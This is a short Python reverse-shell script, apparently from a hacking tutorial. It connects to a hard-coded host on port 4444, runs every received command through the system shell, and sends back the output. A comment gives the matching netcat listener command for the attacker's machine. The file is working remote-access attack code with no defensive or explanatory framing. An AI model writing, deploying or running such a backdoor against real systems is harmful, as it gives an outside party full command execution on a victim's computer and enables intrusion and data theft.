#nc -vv -l -p 4444  -- run this command in linux computer
# it is equivalent to listener.py

import socket
import subprocess

def execute_system_command(command):
    return subprocess.check_output(command, shell=True)

connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection.connect(("192.168.19.69", 4444))

connection.send("\n [+] Connection established.\n")

while True:
    command = connection.recv(1024)
    command_result = execute_system_command(command)
    connection.send(command_result)
    
connection.close()